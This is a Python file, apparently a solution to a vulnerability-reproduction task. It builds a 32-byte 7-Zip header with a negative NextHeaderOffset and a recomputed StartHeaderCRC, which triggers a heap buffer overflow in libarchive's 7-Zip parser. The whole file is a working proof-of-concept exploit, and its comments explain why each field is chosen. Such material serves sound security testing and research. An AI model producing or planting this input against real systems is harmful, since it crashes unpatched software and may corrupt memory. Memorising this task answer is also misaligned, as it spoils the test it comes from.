import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is in libarchive's 7-Zip parser. A crafted
        # `NextHeaderOffset` can cause the calculated archive start offset to become
        # negative. This negative offset is later used in a pointer calculation
        # for a CRC32 check, leading to a heap buffer overflow.

        # To trigger the vulnerability, `file_first_header_position` must be negative.
        # This is calculated as `skip + 32 + next_header_offset`.
        # Assuming the header is at the file start, `skip` is 0.
        # We need `32 + next_header_offset < 0`, so `next_header_offset < -32`.
        # We choose -33.
        next_header_offset = -33
        next_header_offset_bytes = struct.pack('<q', next_header_offset)

        # A non-zero `NextHeaderSize` is needed to trigger the out-of-bounds read.
        # A small value like 4 is sufficient.
        next_header_size = 4
        next_header_size_bytes = struct.pack('<Q', next_header_size)

        # The `NextHeaderCRC` can be zero; it's checked after the vulnerable code path.
        next_header_crc_bytes = struct.pack('<I', 0)

        # The `StartHeaderCRC` must be correct for the vulnerable code to be reached.
        # It's the CRC32 of the 20 bytes following it in the header.
        data_for_crc = (
            next_header_offset_bytes +
            next_header_size_bytes +
            next_header_crc_bytes
        )
        crc_val = zlib.crc32(data_for_crc)
        start_header_crc_bytes = struct.pack('<I', crc_val)

        # Assemble the 32-byte 7-Zip signature header.
        poc = bytearray()
        poc += b'7z\xbc\xaf\x27\x1c'       # 6-byte signature
        poc += b'\x00\x04'                 # 2-byte version
        poc += start_header_crc_bytes      # 4-byte StartHeaderCRC
        poc += next_header_offset_bytes    # 8-byte malicious NextHeaderOffset
        poc += next_header_size_bytes      # 8-byte NextHeaderSize
        poc += next_header_crc_bytes       # 4-byte NextHeaderCRC

        # The fix for this vulnerability introduced a check that rejects files
        # of 32 bytes or less, so this 32-byte PoC will not crash the fixed version.
        return bytes(poc)